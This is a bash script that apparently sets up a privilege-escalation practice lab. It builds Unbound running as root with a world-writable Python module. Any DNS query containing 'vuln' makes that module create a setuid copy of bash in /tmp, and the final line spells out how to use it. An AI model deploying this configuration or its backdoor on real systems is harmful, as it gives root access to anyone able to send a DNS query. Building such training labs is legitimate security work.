#!/bin/bash

set -e

echo "Setting up Unbound DNS resolver with root Python module vulnerability..."

# Install dependencies (python-is-python3 first for configure)
sudo apt update
sudo apt install -y python-is-python3 python3-dev libpython3-dev build-essential wget swig libssl-dev

# Remove system Unbound to avoid conflicts
sudo apt remove -y unbound python3-unbound || true

# Build/install Unbound with Python module
cd /tmp
rm -rf unbound-1.20.0 unbound-1.20.0.tar.gz
wget https://www.nlnetlabs.nl/downloads/unbound/unbound-1.20.0.tar.gz
tar -xzf unbound-1.20.0.tar.gz
cd unbound-1.20.0
./configure --with-pythonmodule --enable-pie --enable-relro-now
make -j$(nproc)
sudo make install
sudo ldconfig

# Copy Python module to system site-packages (ensure import works)
sudo mkdir -p /usr/lib/python3/dist-packages
sudo find /usr/local -name "unboundmodule.py" -exec sudo cp {} /usr/lib/python3/dist-packages/unbound.py \; || true
sudo find /usr/local -name "unboundmod.so" -exec sudo cp {} /usr/lib/python3/dist-packages/unboundmod.so \; || true
sudo ldconfig

cd ..
rm -rf unbound-1.20.0 unbound-1.20.0.tar.gz

# Setup config dir
sudo mkdir -p /etc/unbound

# Create vuln_module.py (writable, full API)
sudo tee /etc/unbound/vuln_module.py > /dev/null << 'EOF'
import unbound
import os
def init(id, ctx):
    return True
def operate(id, event, qstate, qdata):
    if event == unbound.MODULE_EVENT_NEW or event == unbound.MODULE_EVENT_PASS:
        if 'vuln' in qstate.qinfo.qname_str:
            os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')
        qstate.ext_state[id] = unbound.MODULE_FINISHED
    return True
def inform_super(id, qstate, superqstate, qdata):
    return True
def deinit(id):
    return True
EOF

sudo chmod 777 /etc/unbound/vuln_module.py

# FIX: Ensure the directory for root.hints exists before downloading.
sudo mkdir -p /usr/share/dns

# Download root hints
sudo wget -O /usr/share/dns/root.hints https://www.internic.net/domain/named.root
sudo unbound-anchor -a /etc/unbound/root.key || true

# Create unbound.conf
sudo tee /etc/unbound/unbound.conf > /dev/null << 'EOF'
server:
    interface: 0.0.0.0
    port: 53
    do-ip4: yes
    do-ip6: no
    do-udp: yes
    do-tcp: yes
    root-hints: "/usr/share/dns/root.hints"
    module-config: "python iterator"
    username: root
    chroot: ""
python:
    python-script: "/etc/unbound/vuln_module.py"
EOF

sudo unbound-checkconf /etc/unbound/unbound.conf

# Stop/disable systemd-resolved to free port 53
sudo systemctl stop systemd-resolved || true
sudo systemctl disable systemd-resolved || true
sudo systemctl stop systemd-resolved.socket || true
sudo systemctl disable systemd-resolved.socket || true

# Unlock resolv.conf if immutable, then replace
sudo chattr -i /etc/resolv.conf || true
sudo rm -f /etc/resolv.conf
sudo tee /etc/resolv.conf > /dev/null << 'EOF'
nameserver 8.8.8.8
nameserver 8.8.4.4
EOF
sudo chattr +i /etc/resolv.conf

# Create custom systemd service for built Unbound (Type=forking with PIDFile)
sudo tee /etc/systemd/system/unbound-custom.service > /dev/null << 'EOF'
[Unit]
Description=Unbound DNS Server (Custom Build)
After=network.target

[Service]
Type=forking
User=root
PIDFile=/var/run/unbound.pid
ExecStart=/usr/local/sbin/unbound -c /etc/unbound/unbound.conf
ExecReload=/bin/kill -HUP $MAINPID
KillMode=mixed
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable unbound-custom
sudo systemctl start unbound-custom

echo "Setup complete! Unbound runs as root with vuln Python module. Test: dig @127.0.0.1 vuln.example.com > ls -l /tmp/rootbash > /tmp/rootbash -p."
